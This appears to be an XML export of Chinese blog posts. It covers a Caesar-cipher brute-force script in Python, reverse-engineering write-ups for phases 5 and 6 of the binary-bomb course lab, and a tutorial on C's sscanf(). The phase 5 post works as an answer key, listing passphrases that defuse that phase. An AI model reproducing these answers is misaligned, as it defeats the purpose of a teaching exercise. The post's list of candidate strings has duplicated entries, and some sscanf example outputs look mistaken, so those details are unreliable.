##############def Caesar(crypto): Lowercase_ciphertext = chr(crypto) # 将十进制转换为小写的字符 Uppercase_ciphertext = Lowercase_ciphertext.upper() # 将小写字母的转换为大写字母 string.append(Uppercase_ciphertext) # 将大写字母所对应的小写字母写入string列表中 return string ############## 双层循环 ##############string = []for num in range(0,26): # 这是偏移量，也是凯撒密码的密钥，从0 - 25； for word in range(97,123): # a - z 所对应的ASCCII码 crypto = word + num; # 小写字母的ASCII码 + 偏移量 = 新的小写字母的ASCII码 if crypto &gt; 122: # 小写字母的ASCII码的范围为[97,122]，所以新的ASCII码的大小不能超过122 crypto = 96 + crypto % 122 # 对于大于122的ASCII码，对其取余，以96为基础 + 余数 = 新的小写字母的ASCII码 Caesar(crypto) # 调用Caesar函数，将新的小写字母转换为大写字母，将其所对应的明文（小写字母）放入到一个数组中 else: Caesar(crypto) ########## 取每种加密后的结果 ###########for mul in range(0,26): print(&quot;The key is:&quot;,mul) print(&apos;abcdefghijklmnopqrstuvwxyz&apos;) for index in range(0,26): Serial_number = index + mul * 26 print(string[Serial_number],end=&apos;&apos;) print(end=&apos;\n\n&apos;) 输出的结果为：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103The key is: 0abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZThe key is: 1abcdefghijklmnopqrstuvwxyzBCDEFGHIJKLMNOPQRSTUVWXYZAThe key is: 2abcdefghijklmnopqrstuvwxyzCDEFGHIJKLMNOPQRSTUVWXYZABThe key is: 3abcdefghijklmnopqrstuvwxyzDEFGHIJKLMNOPQRSTUVWXYZABCThe key is: 4abcdefghijklmnopqrstuvwxyzEFGHIJKLMNOPQRSTUVWXYZABCDThe key is: 5abcdefghijklmnopqrstuvwxyzFGHIJKLMNOPQRSTUVWXYZABCDEThe key is: 6abcdefghijklmnopqrstuvwxyzGHIJKLMNOPQRSTUVWXYZABCDEFThe key is: 7abcdefghijklmnopqrstuvwxyzHIJKLMNOPQRSTUVWXYZABCDEFGThe key is: 8abcdefghijklmnopqrstuvwxyzIJKLMNOPQRSTUVWXYZABCDEFGHThe key is: 9abcdefghijklmnopqrstuvwxyzJKLMNOPQRSTUVWXYZABCDEFGHIThe key is: 10abcdefghijklmnopqrstuvwxyzKLMNOPQRSTUVWXYZABCDEFGHIJThe key is: 11abcdefghijklmnopqrstuvwxyzLMNOPQRSTUVWXYZABCDEFGHIJKThe key is: 12abcdefghijklmnopqrstuvwxyzMNOPQRSTUVWXYZABCDEFGHIJKLThe key is: 13abcdefghijklmnopqrstuvwxyzNOPQRSTUVWXYZABCDEFGHIJKLMThe key is: 14abcdefghijklmnopqrstuvwxyzOPQRSTUVWXYZABCDEFGHIJKLMNThe key is: 15abcdefghijklmnopqrstuvwxyzPQRSTUVWXYZABCDEFGHIJKLMNOThe key is: 16abcdefghijklmnopqrstuvwxyzQRSTUVWXYZABCDEFGHIJKLMNOPThe key is: 17abcdefghijklmnopqrstuvwxyzRSTUVWXYZABCDEFGHIJKLMNOPQThe key is: 18abcdefghijklmnopqrstuvwxyzSTUVWXYZABCDEFGHIJKLMNOPQRThe key is: 19abcdefghijklmnopqrstuvwxyzTUVWXYZABCDEFGHIJKLMNOPQRSThe key is: 20abcdefghijklmnopqrstuvwxyzUVWXYZABCDEFGHIJKLMNOPQRSTThe key is: 21abcdefghijklmnopqrstuvwxyzVWXYZABCDEFGHIJKLMNOPQRSTUThe key is: 22abcdefghijklmnopqrstuvwxyzWXYZABCDEFGHIJKLMNOPQRSTUVThe key is: 23abcdefghijklmnopqrstuvwxyzXYZABCDEFGHIJKLMNOPQRSTUVWThe key is: 24abcdefghijklmnopqrstuvwxyzYZABCDEFGHIJKLMNOPQRSTUVWXThe key is: 25abcdefghijklmnopqrstuvwxyzZABCDEFGHIJKLMNOPQRSTUVWXY 在得到上述的密钥后，对于Caesar加密后的密文，我们都应当能够解密，得到密文； 2.解密实例往往在解密的过程中，得到的密文往往很长，那么能不能让计算机自己自动用25种密钥进行紧密呢？答案是可以的，那么下面我们据举个例子，就以上面的加密后的密文为例吧。密文：ZHDUHIDPLOB代码实现：123456789101112131415161718192021222324252627282930313233# Function:该脚本是用来解密凯撒密码的：可以输出凯撒密码的所有情况，也可以根据输入的密文，进行自动解密# Date：2019-4-26string = input(&quot;Please input encryption:&quot;)length = len(string)############## 构造的函数 ##############def Caesar(crypto,index,word): Lowercase_ciphertext = chr(crypto) # 将十进制转换为小写的字符 Uppercase_ciphertext = Lowercase_ciphertext.upper() # 将小写字母的转换为大写字母 if string[index] == Uppercase_ciphertext: # 判断字符串中的每个字符是否与凯撒密文的字符是否相等 Crypto_string.append(chr(word)) # 如果相等，就将大写字母所对应的小写字母写入Crypto_string列表中 return Crypto_string # Caesar函数返回的值为一个列表############## 三个循环体 ##############Crypto_string = []for num in range(0,26): # 这是偏移量，也是凯撒密码的密钥，从0 - 25； for index in range(0,len(string)): # 为了遍历字符串中的每个字符 for word in range(97,123): # a - z 所对应的ASCCII码 crypto = word + num; # 小写字母的ASCII码 + 偏移量 = 新的小写字母的ASCII码 if crypto &gt; 122: # 小写字母的ASCII码的范围为[97,122]，所以新的ASCII码的大小不能超过122 crypto = 96 + crypto % 122 # 对于大于122的ASCII码，对其取余，以96为基础 + 余数 = 新的小写字母的ASCII码 Caesar(crypto,index,word) # 调用Caesar函数，将新的小写字母转换为大写字母，然后对于符合string中的字符，将其所对应的明文（小写字母）放入到一个数组中 else: Caesar(crypto,index,word) # 对加过偏移量的ASCCII码的值在[97,122]之间的，直接调用Caesar函数 ########## 取每种加密后的结果 ########### for mul in range(0,26): print(&quot;The key is:&quot;,mul,&apos;| The encrypto is：&apos;,end=&apos;&apos;) for index_sec in range(0,length): Serial_number = index_sec + mul * length print(Crypto_string[Serial_number],end=&apos;&apos;) print(end=&apos;\n&apos;) 输出结果为：从上面的结果可以得出，密钥为 3，明文为：wearefamily。与上文的明文一致，至此可以推出该程序的正确性。 四、学习感悟在做测试的时候，自己的思想也开始慢慢的发生变化：自己要动手写一下程序，锻炼自己的思维能力和编程能力。今后在遇到问题的时候，我将会自己写程序来解决，也是边学习python，边锻炼自己。 五、每日一句不管有多苦，千万要记住：苦难是我们人生路上不可缺少的经历，只有活着，才有幸福的可能！]]></content>
      <tags>
        <tag>密码学</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[二进制炸弹：Phase_6解题总结（1）]]></title>
    <url>%2F2019%2F04%2F25%2F2019.04.25%EF%BC%8846%EF%BC%89%2F</url>
    <content type="text"><![CDATA[☛ 前言：今天对Phase_6做了分析，觉得Phase_6 的难度明显大了很多，但是通过分析，我对于Phase_6整体的功能有了大概的认识，现在就我分析的内容进行总结。 一、相关汇编代码1.Phase_6的汇编代码123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798008048da5 &lt;phase_6&gt;: 8048da5: 56 push %esi 8048da6: 53 push %ebx 8048da7: 83 ec 44 sub $0x44,%esp 8048daa: 8d 44 24 10 lea 0x10(%esp),%eax 8048dae: 89 44 24 04 mov %eax,0x4(%esp) 8048db2: 8b 44 24 50 mov 0x50(%esp),%eax 8048db6: 89 04 24 mov %eax,(%esp) 8048db9: e8 6e 03 00 00 call 804912c &lt;read_six_numbers&gt; 8048dbe: be 00 00 00 00 mov $0x0,%esi 8048dc3: 8b 44 b4 10 mov 0x10(%esp,%esi,4),%eax 8048dc7: 83 e8 01 sub $0x1,%eax 8048dca: 83 f8 05 cmp $0x5,%eax 8048dcd: 76 05 jbe 8048dd4 &lt;phase_6+0x2f&gt; 8048dcf: e8 31 03 00 00 call 8049105 &lt;explode_bomb&gt; 8048dd4: 83 c6 01 add $0x1,%esi 8048dd7: 83 fe 06 cmp $0x6,%esi 8048dda: 74 1b je 8048df7 &lt;phase_6+0x52&gt; 8048ddc: 89 f3 mov %esi,%ebx 8048dde: 8b 44 9c 10 mov 0x10(%esp,%ebx,4),%eax 8048de2: 39 44 b4 0c cmp %eax,0xc(%esp,%esi,4) 8048de6: 75 05 jne 8048ded &lt;phase_6+0x48&gt; 8048de8: e8 18 03 00 00 call 8049105 &lt;explode_bomb&gt; 8048ded: 83 c3 01 add $0x1,%ebx 8048df0: 83 fb 05 cmp $0x5,%ebx 8048df3: 7e e9 jle 8048dde &lt;phase_6+0x39&gt; 8048df5: eb cc jmp 8048dc3 &lt;phase_6+0x1e&gt; 8048df7: 8d 44 24 10 lea 0x10(%esp),%eax 8048dfb: 8d 5c 24 28 lea 0x28(%esp),%ebx 8048dff: b9 07 00 00 00 mov $0x7,%ecx 8048e04: 89 ca mov %ecx,%edx 8048e06: 2b 10 sub (%eax),%edx 8048e08: 89 10 mov %edx,(%eax) 8048e0a: 83 c0 04 add $0x4,%eax 8048e0d: 39 d8 cmp %ebx,%eax 8048e0f: 75 f3 jne 8048e04 &lt;phase_6+0x5f&gt; 8048e11: bb 00 00 00 00 mov $0x0,%ebx 8048e16: eb 1d jmp 8048e35 &lt;phase_6+0x90&gt; 8048e18: 8b 52 08 mov 0x8(%edx),%edx 8048e1b: 83 c0 01 add $0x1,%eax 8048e1e: 39 c8 cmp %ecx,%eax 8048e20: 75 f6 jne 8048e18 &lt;phase_6+0x73&gt; 8048e22: eb 05 jmp 8048e29 &lt;phase_6+0x84&gt; 8048e24: ba 3c c1 04 08 mov $0x804c13c,%edx 8048e29: 89 54 b4 28 mov %edx,0x28(%esp,%esi,4) 8048e2d: 83 c3 01 add $0x1,%ebx 8048e30: 83 fb 06 cmp $0x6,%ebx 8048e33: 74 17 je 8048e4c &lt;phase_6+0xa7&gt; 8048e35: 89 de mov %ebx,%esi 8048e37: 8b 4c 9c 10 mov 0x10(%esp,%ebx,4),%ecx 8048e3b: 83 f9 01 cmp $0x1,%ecx 8048e3e: 7e e4 jle 8048e24 &lt;phase_6+0x7f&gt; 8048e40: b8 01 00 00 00 mov $0x1,%eax 8048e45: ba 3c c1 04 08 mov $0x804c13c,%edx 8048e4a: eb cc jmp 8048e18 &lt;phase_6+0x73&gt; 8048e4c: 8b 5c 24 28 mov 0x28(%esp),%ebx 8048e50: 8d 44 24 2c lea 0x2c(%esp),%eax 8048e54: 8d 74 24 40 lea 0x40(%esp),%esi 8048e58: 89 d9 mov %ebx,%ecx 8048e5a: 8b 10 mov (%eax),%edx 8048e5c: 89 51 08 mov %edx,0x8(%ecx) 8048e5f: 83 c0 04 add $0x4,%eax 8048e62: 39 f0 cmp %esi,%eax 8048e64: 74 04 je 8048e6a &lt;phase_6+0xc5&gt; 8048e66: 89 d1 mov %edx,%ecx 8048e68: eb f0 jmp 8048e5a &lt;phase_6+0xb5&gt; 8048e6a: c7 42 08 00 00 00 00 movl $0x0,0x8(%edx) 8048e71: be 05 00 00 00 mov $0x5,%esi 8048e76: 8b 43 08 mov 0x8(%ebx),%eax 8048e79: 8b 00 mov (%eax),%eax 8048e7b: 39 03 cmp %eax,(%ebx) 8048e7d: 7d 05 jge 8048e84 &lt;phase_6+0xdf&gt; 8048e7f: e8 81 02 00 00 call 8049105 &lt;explode_bomb&gt; 8048e84: 8b 5b 08 mov 0x8(%ebx),%ebx 8048e87: 83 ee 01 sub $0x1,%esi 8048e8a: 75 ea jne 8048e76 &lt;phase_6+0xd1&gt; 8048e8c: 83 c4 44 add $0x44,%esp 8048e8f: 5b pop %ebx 8048e90: 5e pop %esi 8048e91: c3 ret 2.node1-6 处的数据12345678910111213141516171819202122232425.data:0804C13C public node1.data:0804C13C node1 dd 0DDh ; DATA XREF: phase_6:loc_8048E24o.data:0804C13C ; phase_6+A0o.data:0804C140 dd 1.data:0804C144 dd 804C148h.data:0804C148 public node2.data:0804C148 node2 dd 224h.data:0804C14C dd 2.data:0804C150 dd 804C154h.data:0804C154 public node3.data:0804C154 node3 dd 2F4h.data:0804C158 dd 3.data:0804C15C dd 804C160h.data:0804C160 public node4.data:0804C160 node4 dd 2F1h.data:0804C164 dd 4.data:0804C168 dd 804C16Ch.data:0804C16C public node5.data:0804C16C node5 dd 0FCh.data:0804C170 dd 5.data:0804C174 dd 804C178h.data:0804C178 public node6.data:0804C178 node6 dd 3BBh.data:0804C17C dd 6.data:0804C180 dd 0 二、相关伪代码（IDA反编译）1.Phase_6的伪代码 相关伪代码会在下文列出 三、代码分析1.Phase_6代码分析通过对汇编代码和伪代码的综合分析，发现Phase_6是由多个循环体构成的，经过对各个循环体的分析有了如下的认识： 1234567891011121314151617// ①②③④⑤⑥所对应的伪代码v1 = 0;while ( 1 )&#123; if ( (unsigned int)(v15[v1] - 1) &gt; 5 ) explode_bomb(); if ( ++v1 == 6 ) break; v2 = v1; do &#123; if ( *(&amp;v14 + v1) == v15[v2] ) explode_bomb(); ++v2; &#125; while ( v2 &lt;= 5 );&#125; ① 跳转前：判断输入的数是否小于等于 6 ；跳转后：变量 v1 += 1； ② 跳转前：是在一个循环体内，比较（0xc + %esp + 4 %esi）和（0x10 + %esp + 4 %ebx）两者的值，其中 esi 取 1-5，ebx是随着esi的，比如esi每次取一个数，ebx都会取 [esi，5]；跳转后：循环变量大于5，就跳出这个小循环，也就是每一次大的循环（循环变量 = n），在小循环中的循环次数为：6 - n 次； ③ 跳转前：与 ② 共同在大循环中形成了一个小循环，是小循环的结束位置，如果不满足循环变量 ≤ 5，就执行 ③；跳转后：回到循环体的起始位置； ④ 跳转前：是无条件跳转；跳转后：回到了大循环体的起始位置； ⑤ 跳转前：只要“大”的循环变量 = 6，就跳出第一个大循环体；跳转后：跳出循环体，执行下面的指令； 1234567891011121314151617181920212223242526272829303132// ① 所对应的伪代码v3 = v15; do &#123; *v3 = 7 - *v3; ++v3; &#125; while ( v3 != &amp;v16 );// ②③④⑤⑥ 所对应的伪代码v4 = 0;do&#123; v7 = v15[v4]; if ( v7 &lt;= 1 ) &#123; v5 = &amp;node1; &#125; else &#123; v6 = 1; v5 = &amp;node1; do &#123; v5 = (_DWORD *)v5[2]; ++v6; &#125; while ( v6 != v7 ); &#125; *(&amp;v16 + v4++) = (int)v5;&#125;while ( v4 != 6 ); ① 形成一个单循环； ② — ⑦ 形成一个双循环，也包括了一个条件语句：其中 ⑥ 为条件语句中的小循环；③ 和 ⑦ 形成一个条件语句； 1234567891011121314151617181920212223// ①②所对应的伪代码v8 = v16;v9 = &amp;v17;for ( i = v16; ; i = v11 )&#123; v11 = *(_DWORD *)v9; *(_DWORD *)(i + 8) = *(_DWORD *)v9; v9 += 4; if ( v9 == &amp;v18 ) break;&#125;// ③④ 所对应的伪代码v8 = v16;v9 = &amp;v17;for ( i = v16; ; i = v11 )&#123; v11 = *(_DWORD *)v9; *(_DWORD *)(i + 8) = *(_DWORD *)v9; v9 += 4; if ( v9 == &amp;v18 ) break;&#125; ① 和 ②共同构成一个循环语句； ③ 和 ④共同构成一个循环语句；2.node数据的分析通过对伪代码的分析，发现了相关的结点，我猜测可能与链表有关系，于是针对node又进行了分析： 可以看出node1 - 6可以形成了一个链表，格式如下：123456789101112typedef struct node&#123; int value; int id; struct node *next;&#125;node;node node1=&#123;0xDD,1,&amp;node2&#125;;node node2=&#123;0x224,2,&amp;node3&#125;;node node3=&#123;0x2F4,3,&amp;node4&#125;;node node4=&#123;0x2F1,4,&amp;node5&#125;;node node5=&#123;0xFC,5,&amp;node6&#125;;node node6=&#123;0x3BB,6,NULL&#125;; 四、后续工作 这道题目我目前只分析到了这里，对于伪代码和汇编代码的分析不够深入，对gdb的调试掌握的还不够全面，所以后续我将继续会做一下的工作： 继续分析每块循环结构的功能； 继续学习有关gdb的一些操作； 加深对链表的学习；五、学习感悟在做这道题的时候，明显感觉到难度和前几个阶段相比较大，虽然我现在还未能解出该题，但是我将会继续努力学习，真正的掌握这道题所带给我的知识点。六、每日一句环境永远不会十全十美，消极的人受环境控制，积极的人却控制环境。]]></content>
      <tags>
        <tag>二进制</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[二进制炸弹：Phase_5解题总结]]></title>
    <url>%2F2019%2F04%2F23%2F2019.04.23%EF%BC%8845%EF%BC%89%2F</url>
    <content type="text"><![CDATA[前言：在 3 个小时的“奋战”中，中间也经历了很多波折，终于在15：30的时候，找到了Phase_5的通关口令。下面我就重点来总结一下关于Phase_5的解题过程。一、相关汇编代码1.Phase_5的汇编代码1234567891011121314151617181920212223242526272829303132333435363708048d5c &lt;phase_5&gt;: 8048d5c: 53 push %ebx 8048d5d: 83 ec 18 sub $0x18,%esp 8048d60: 8b 5c 24 20 mov 0x20(%esp),%ebx 8048d64: 89 1c 24 mov %ebx,(%esp) // 调用8048fdb处的函数（计算字符串的长度），并将字符串的长度与 6 相比，如果字符串的长度为 6 ，则跳转到8048d76继续执行指令，若不相等，则调用bomb函数； 8048d67: e8 6f 02 00 00 call 8048fdb &lt;string_length&gt; 8048d6c: 83 f8 06 cmp $0x6,%eax 8048d6f: 74 05 je 8048d76 &lt;phase_5+0x1a&gt; 8048d71: e8 8f 03 00 00 call 8049105 &lt;explode_bomb&gt; 8048d76: ba 00 00 00 00 mov $0x0,%edx // edx = v1 8048d7b: b8 00 00 00 00 mov $0x0,%eax // eax = result // 通过一个循环，取出字符串的每一个字符，并将每个字符与15按位做与运算； // 也可以这样理解，将每个字符转换对应的十进制，按照二进制的形式与15的二进制形式（1111）做与运算，也就是只取每个字符的最后四位，并将所得的数赋值给 ecx； 8048d80: 0f b6 0c 03 movzbl (%ebx,%eax,1),%ecx 8048d84: 83 e1 0f and $0xf,%ecx // edx的值为 0x804a1a0 + 4 * ecx 地址所指向的数据，ecx的值是 把我们输入的每个字符 &amp; 15 的结果作为数组下标，然后在数据中取到的； 8048d87: 03 14 8d a0 a1 04 08 add 0x804a1a0(,%ecx,4),%edx // eax = eax +1 ，然后再将eax的值与 6 相比，如果不等于则跳转到8048d80，形成一个循环，如果想等，则继续向下执行指令； 8048d8e: 83 c0 01 add $0x1,%eax 8048d91: 83 f8 06 cmp $0x6,%eax 8048d94: 75 ea jne 8048d80 &lt;phase_5+0x24&gt; // 将 edx（v1） 中的值与 61 相比较，如果相等的话就跳转到程序的Finish段，不等的话就bomb，这里edx的值是在8048d87处得到的； 8048d96: 83 fa 3d cmp $0x3d,%edx 8048d99: 74 05 je 8048da0 &lt;phase_5+0x44&gt; 8048d9b: e8 65 03 00 00 call 8049105 &lt;explode_bomb&gt; // Finish段 8048da0: 83 c4 18 add $0x18,%esp 8048da3: 5b pop %ebx 8048da4: c3 ret 2.0x804a1a0处的数据1234567891011121314151617.rodata:0804A1A0 ; int array_3143[].rodata:0804A1A0 array_3143 dd 2 ; DATA XREF: phase_5+2Br.rodata:0804A1A4 dd 10.rodata:0804A1A8 dd 6.rodata:0804A1AC dd 1.rodata:0804A1B0 dd 12.rodata:0804A1B4 dd 16.rodata:0804A1B8 dd 9.rodata:0804A1BC dd 3.rodata:0804A1C0 dd 4.rodata:0804A1C4 dd 7.rodata:0804A1C8 dd 14.rodata:0804A1CC dd 5.rodata:0804A1D0 dd 11.rodata:0804A1D4 dd 8.rodata:0804A1D8 dd 15.rodata:0804A1DC dd 13 二、相关伪代码（IDA反编译）1.Phase_5的伪代码12345678910111213141516int __cdecl phase_5(int a1)&#123; int v1; // edx@3 int result; // eax@3 if ( string_length(a1) != 6 ) explode_bomb(); v1 = 0; result = 0; do v1 += array_3143[*(_BYTE *)(a1 + result++) &amp; 0xF]; while ( result != 6 ); if ( v1 != 61 ) explode_bomb(); return result;&#125; 三、代码分析1.Phase_5代码分析 通过对汇编代码和伪代码的综合分析，对Phase_5的功能有了如下的认识： 8048d67：计算输入字符串的长度，判断长度是否等于 6 ，如果不等则爆炸，**也就是要求我们输入的字符串的长度必须为 6** ； // if ( string_length(a1) != 6 ) &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;explode_bomb(); 8048d84：经过一个循环，在这个循环体中，要求将我们输入的每个字符与 15 做与运算，并且将所得的结果作为数组的index，取出对应的数值相加； // v1 += array\_3143[\*(\_BYTE \*)(a1 + result++) & 15]; 8048d91：当循环变量 result = 6 的时候，退出循环体，也就是循环体进行了6次循环运算； // while ( result != 6 ); 8048d96：将经过do while(); 运算后的v1 与61进行比较，不相等则bomb；也就是根据 index 为下标取得数组值得累加为61；// if ( v1 != 61 )&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;explode_bomb();/font&gt;2.0x804a1a0处的数据分析根据上文的内容可以分析到，array[ ]数组中的数据（十进制）为2,10,6,1,12,16,9,3,4,7,14,5,11,8,15,133.解题思路经过上文的分析，可以清楚的知道Phase_5做题思路： 首先我们需要输入一个 6 位长的字符串； 将字符串中的每个字符以二进制方式与 1111 做与运算，将每次运算的结果作为 index； 取出0x804a1a0—0804A1DC的数据，并将这些数据按照先后顺序形成一个数组； 在这16个数据中找出 6 个数字，要求这 6 个数字相加等于 61； 按照从小到大的顺序，再分别列出这 6 个数字所对应的 index； 写出脚本，从 a-z，看谁与 1111（二进制）做与运算，得到的结果为上面的 index； 将这些字符连在一起，就是我们要输入的字符串；四、解题过程1.列出array[]的数据数据为2,10,6,1,12,16,9,3,4,7,14,5,11,8,15,132.找出 6 个数，其和为 61经过观察，可以找出 6 个数，他们逐一相加得 61，这 6 个数分别为10、1、16、7、14、13，并将这 6 个数形成一个数组array = [10、1、16、7、14、13]，它们的下标为别为：1，3，5，9，10，153.字符逐一与15做与运算在这里我用到的只是 [a^z] 的字符，分别找到 a 和 z 所对应的十进制，然后写脚本：字符的十进制与15做与运算：12for num in range(97,123): print(&quot;Character -&gt;&quot;,chr(num),&quot;|&quot;, num &amp; 15, &quot;&lt;- Index&quot;,); 运算的结果如下图： 4.得到字符串&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;可以从第 2 步得出，要想 v1 = 61，则必须需要找出 6 个数值，这 6 个数值是通过字符串中的每个字符与 15 做与运算，将每次的结果作为数组array[] 的 index，分别取出相应的这 6 个数据。&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;我们已经找到了这 6 个数，那么他们对应的下标也分别为1，3，5，9，10，15，那么我们只需要在结果里找到相应的字符即可: 下标为 1 对应的字符为：&nbsp;&nbsp;a&nbsp;&nbsp;&nbsp;q 下标为 3 对应的字符为：&nbsp;&nbsp;c&nbsp;&nbsp;&nbsp;s 下标为 5 对应的字符为：&nbsp;&nbsp;e&nbsp;&nbsp;&nbsp;u 下标为 9 对应的字符为：&nbsp;&nbsp;i&nbsp;&nbsp;&nbsp;&nbsp;y 下标为 10 对应的字符为：j&nbsp;&nbsp;&nbsp;&nbsp;z 下标为 15 对应的字符为：o 那么我们要找的字符串有 32种可能：aceijo、aceizo、aceyjo、aceyzo、acuijo、acuizo、acuyjo、acuyzoaseijo、aseizo、aseyjo、aceyzo、asuijo、asuizo、asuyjo、asuyzoqceijo、qceizo、qceyjo、qceyzo、qcuijo、qcuizo、qcuyjo、qcuyzoqseijo、qseizo、qseyjo、qceyzo、qsuijo、qsuizo、qsuyjo、qsuyzo 5.验证答案为了体现答案的正确性，我在每一行随机抽取了一个字符串作为通关口令： aceyzo asuizo qceijo qsuizo五、学习感悟在做这道题目过程中，让我觉得自己有好多要说出来的东西，并没有写出来，隐约地感觉到这道题还有知识点需要我去学习和总结的，第二阶段过后再好好的总结一下相关知识点吧。六、每日一句从梦想一开始，我们就未曾冀望过梦想落幕。梦想的舞台跌宕起伏，只是，我们永远不会让梦想谢幕。从导演到编剧，从演员到观众，我们每个人都在为刻画梦想而昂然奋斗，浓墨重彩，抑或淡染素描。]]></content>
      <tags>
        <tag>二进制</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[sscanf()函数的详细总结 + 实例]]></title>
    <url>%2F2019%2F04%2F22%2F2019.04.22%EF%BC%8844%EF%BC%89%2F</url>
    <content type="text"><![CDATA[前言：今天注重的解决了出现在Phase_3中的问题：当时对__isoc99_sscanf@plt分析的时候，因为自己水平有限，所以当时知识认为sscanf()函数与scanf()函数一样，都只是一个输入函数。今天重新分析Phase_3的时候，发现问题的所在：sscanf() ≠ scanf()。今天就详细的总结一下sscanf()函数的内容。 一、有关描述[1] sscanf() 是从一个字符串中读进与指定格式相符的数据. 1.sscanf()格式： int sscanf(const char str, const char format, …)&lt;/font&gt; str：为C 字符串，是函数检索数据的源； format：为C 字符串，包含了以下各项中的一个或多个：空格字符、非空格字符 和 format 说明符。format 说明符形式为 [=%[*][width][modifiers]type=]2.format详解 “*” ：这是一个可选的星号，表示数据是从流 stream 中读取的，但是可以被忽视，即它不存储在对应的参数中； width：这指定了在当前读取操作中读取的最大字符数； modifiers ：为对应的附加参数所指向的数据指定一个不同于整型（针对 d、i 和 n）、无符号整型（针对 o、u 和 x）或浮点型（针对 e、f 和 g）的大小： h ：短整型（针对 d、i 和 n），或无符号短整型（针对 o、u 和 x） l ：长整型（针对 d、i 和 n），或无符号长整型（针对 o、u 和 x），或双精度型（针对 e、f 和 g） L ：长双精度型（针对 e、f 和 g）； type：一个字符，指定了要被读取的数据类型以及数据读取方式；3.附加参数&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;这个函数接受一系列的指针作为附加参数，每一个指针都指向一个对象，对象类型由 format 字符串中相应的 % 标签指定，参数与 % 标签的顺序相同。&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;针对检索数据的 format 字符串中的每个 format 说明符，应指定一个附加参数。如果您想要把 sscanf 操作的结果存储在一个普通的变量中，您应该在标识符前放置引用运算符（&amp;），例如：12int n;sscanf (str,&quot;%d&quot;,&amp;amp;n); 4.函数的返回值[2] 如果成功，该函数返回成功匹配和赋值的个数。如果到达文件末尾或发生读错误，则返回 EOF。 二、sscanf() 主要功能 返回值是读取的参数个数; 取指定长度的字符串; 取到指定字符为止的字符串; 取到指定字符集为止的字符串; 取仅包含指定字符集的字符串; 获取指定字符中间的字符串; 指定要跳过的字符串; 分割以某字符隔开的字符串; 提取邮箱地址; 过滤掉不想截取或不需要的字符串;三、sscanf()实例[3]1.最简单的用法1234string = &quot;China beijing 123&quot;;ret = sscanf(string, &quot;%s %s %d&quot;, buf1, buf2, &amp;digit);printf(&quot;string = %s\n&quot;, string);printf(&quot;ret=%d, buf1=%s, buf2=%s, digit=%d\n&quot;, ret, buf1, buf2, digit); 执行结果为：string = China beijing 123 ret=3, buf1=china, buf2=beijing, digit=123可以看出,sscanf的返回值是读取的参数个数。 2.取指定长度的字符串1234string = &quot;123456789&quot;;sscanf(string, &quot;%5s&quot;, buf1);printf(&quot;string=%s\n&quot;, string);printf(&quot;buf1=%s\n&quot;, buf1); 执行结果为：string=123456789 buf1=12345 3.取到指定字符为止的字符串1234string = &quot;123/456&quot;;sscanf(string, &quot;%[^/]&quot;, buf1);printf(&quot;string=%s\n&quot;, string);printf(&quot;buf1=%s\n&quot;, buf1); 执行结果为：string=123/456 buf1=123 4.取到指定字符集为止的字符串1234string = &quot;123abcABC&quot;;sscanf(string, &quot;%[^A-Z]&quot;, buf1);printf(&quot;string=%s\n&quot;, string);printf(&quot;buf1=%s\n\n&quot;, buf1); 执行结果为：string=123abcABC buf1=123abc 5.取仅包含指定字符集的字符串1234string = &quot;0123abcABC&quot;;sscanf(string, &quot;%[0-9]%[a-z]%[A-Z]&quot;, buf1, buf2, buf3);printf(&quot;string=%s\n&quot;, string);printf(&quot;buf1=%s, buf2=%s, buf3=%s\n\n&quot;, buf1, buf2, buf3); 执行结果为：string=0123abcABC buf1=0123, buf2=abc, buf3=ABC 6.获取指定字符中间的字符串1234string = &quot;ios&lt;android&gt;wp7&quot;;sscanf(string, &quot;%*[^&lt;]&lt;%[^&gt;]&quot;, buf1);printf(&quot;string=%s\n&quot;, string);printf(&quot;buf1=%s\n\n&quot;, buf1); 执行结果为：string=ios&lt;android&gt;wp7 buf1=android 7.指定要跳过的字符串1234string = &quot;iosVSandroid&quot;;sscanf(string, &quot;%[a-z]VS%[a-z]&quot;, buf1, buf2);printf(&quot;string=%s\n&quot;, string);printf(&quot;buf1=%s, buf2=%s\n\n&quot;, buf1, buf2); 执行结果为：string=iosVSandroid buf1=ios, buf2=android 8.分割以某字符隔开的字符串123456string = &quot;android-iphone-wp7&quot;;/*字符串取道&apos;-&apos;为止,后面还需要跟着分隔符&apos;-&apos;,起到过滤作用,有点类似于第7点*/sscanf(string, &quot;%[^-]-%[^-]-%[^-]&quot;, buf1, buf2, buf3);printf(&quot;string=%s\n&quot;, string);printf(&quot;buf1=%s, buf2=%s, buf3=%s\n\n&quot;, buf1, buf2, buf3); 执行结果为：string=android-iphone-wp7 buf1=android, buf2=iphone, buf3=wp7 9.提取邮箱地址1234string = &quot;Email:beijing@sina.com.cn&quot;;sscanf(string, &quot;%[^:]:%[^@]@%[^.].%s&quot;, buf1, buf2, buf3, buf4);printf(&quot;string=%s\n&quot;, string);printf(&quot;buf1=%s, buf2=%s, buf3=%s, buf4=%s\n\n&quot;, buf1, buf2, buf3, buf4); 执行结果为：string=Email:beijing@sina.com.cn buf1=Email, buf2=beijing, buf3=sina, buf4=com.cn 10.过滤掉不想截取或不需要的字符串1234string = &quot;android iphone wp7&quot;;sscanf(string, &quot;%s %*s %s&quot;, buf1, buf2);printf(&quot;string=%s\n&quot;, string);printf(&quot;buf1=%s, buf2=%s\n\n&quot;, buf1, buf2); string=android iphone wp7 buf1=android, buf2= 四、参考资料[1] http://www.runoob.com/cprogramming/c-function-sscanf.html[2] http://www.cplusplus.com/reference/cstdio/sscanf/[3] https://blog.csdn.net/pengnanzheng/article/details/81120890 